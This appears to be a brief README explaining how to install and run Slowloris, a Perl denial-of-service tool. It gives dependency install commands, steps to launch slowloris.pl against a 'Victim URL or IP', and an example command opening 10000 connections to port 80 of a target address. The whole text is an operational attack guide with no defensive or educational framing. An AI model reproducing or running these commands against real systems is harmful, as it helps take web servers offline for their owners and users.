# How use Slowloris

## Requirements:

- sudo apt-get update  
- sudo apt-get install perl
- sudo apt-get install libwww-mechanize-shell-perl
- sudo apt-get install perl-mechanize


1. Download slowloris.pl
2. Open Terminal
3. cd /thePathToYourSlowloris.plFile
4. ./slowloris.pl
5. perl slowloris.pl -dns (Victim URL or IP) -options

**Done!**

Laera Loris

## A Litle example ...
perl slowloris.pl -dns 123.456.789.123 -port 80 -timeout 5 -num 10000 -tcpto 1
